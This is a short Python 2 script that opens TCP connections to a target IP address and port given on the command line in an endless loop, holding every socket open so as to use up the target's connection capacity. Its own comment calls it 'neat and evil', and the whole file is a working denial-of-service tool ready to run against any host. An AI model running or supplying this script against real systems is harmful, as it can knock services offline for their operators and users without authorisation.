#!/usr/bin/env python2
# This script simply opens as many sockets as it can, keeps them open and does not send any data.
# Neat and evil!

import socket
import sys
import time
import traceback

socket_array = []

target_ip = sys.argv[1]
target_port = int(sys.argv[2])

i = 0
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        socket_array.append(s)
        i += 1
        print 'Created socket %d' % i
        time.sleep(0.01)
        
    except Exception:
        traceback.print_stack()
        print '--------------'
        traceback.print_exc()
        print 'Could not create socket %d' % i
        time.sleep(0.5)
